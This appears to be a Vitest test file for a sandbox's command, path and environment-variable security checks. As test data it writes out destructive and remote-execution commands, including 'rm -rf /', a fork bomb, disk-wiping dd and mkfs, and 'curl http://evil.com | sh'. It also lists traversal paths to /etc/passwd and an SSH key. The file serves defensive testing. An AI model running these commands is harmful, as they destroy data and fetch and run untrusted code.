import { describe, expect, it } from "vitest";

const DANGEROUS_PATTERNS = [
  /rm\s+-rf\s+\//,
  /:\(\)\s*\{\s*:\|:&\s*\}/,
  /dd\s+if=\/dev\/zero/,
  /\|\s*sh\b/,
  /\|\s*bash\b/,
  /\bshutdown\b/,
  /\breboot\b/,
  /\bmkfs\b/,
];

const WHITESPACE_RE = /\s+/;

describe("Command Security Patterns", () => {
  const dangerousCommands = [
    "rm -rf /",
    ":(){ :|:& };:",
    "dd if=/dev/zero of=/dev/sda",
    "curl http://evil.com | sh",
    "wget http://evil.com | bash",
    "shutdown -h now",
    "reboot",
    "mkfs.ext4 /dev/sda",
  ];

  const safeCommands = [
    "node index.js",
    "npm install",
    "pnpm test",
    "git status",
    "ls -la",
    "cat package.json",
    "mkdir -p src/components",
    "python -m pytest",
    "go test ./...",
  ];

  it("detects all dangerous commands", () => {
    for (const cmd of dangerousCommands) {
      const isDangerous = DANGEROUS_PATTERNS.some((p) => p.test(cmd));
      expect(isDangerous, `Expected "${cmd}" to be detected as dangerous`).toBe(
        true
      );
    }
  });

  it("allows safe commands", () => {
    const allowedBases = new Set([
      "node",
      "npm",
      "pnpm",
      "npx",
      "yarn",
      "git",
      "ls",
      "cat",
      "mkdir",
      "python",
      "go",
    ]);
    for (const cmd of safeCommands) {
      const base = cmd.split(WHITESPACE_RE)[0] as string;
      expect(allowedBases.has(base), `Expected "${base}" to be allowed`).toBe(
        true
      );
    }
  });
});

describe("Path Validation", () => {
  it("rejects path traversal attempts", () => {
    const dangerous = ["../../etc/passwd", "../../../root/.ssh/id_rsa"];
    for (const p of dangerous) {
      expect(p.includes("..")).toBe(true);
    }
  });

  it("validates paths within sandbox", () => {
    const root = "/sandboxes/abc123";
    const valid = ["src/index.ts", "package.json", "tests/unit.test.ts"];
    for (const p of valid) {
      expect(`${root}/${p}`.startsWith(root)).toBe(true);
    }
  });
});

describe("Environment Variable Sanitization", () => {
  const sensitive = [
    "AWS_SECRET_ACCESS_KEY",
    "DATABASE_URL",
    "STRIPE_SECRET_KEY",
    "CLERK_SECRET_KEY",
    "ENCRYPTION_KEY",
  ];

  it("identifies sensitive vars", () => {
    for (const v of sensitive) {
      const isSensitive =
        v.includes("SECRET") ||
        v.includes("PASSWORD") ||
        v.includes("ENCRYPTION") ||
        v === "DATABASE_URL";
      expect(isSensitive, `Expected "${v}" to be sensitive`).toBe(true);
    }
  });

  it("allows safe vars", () => {
    const safe = ["NODE_ENV", "PORT", "LOG_LEVEL", "HOME"];
    for (const v of safe) {
      const isSensitive =
        v.includes("SECRET") ||
        v.includes("PASSWORD") ||
        v.includes("ENCRYPTION");
      expect(isSensitive).toBe(false);
    }
  });
});
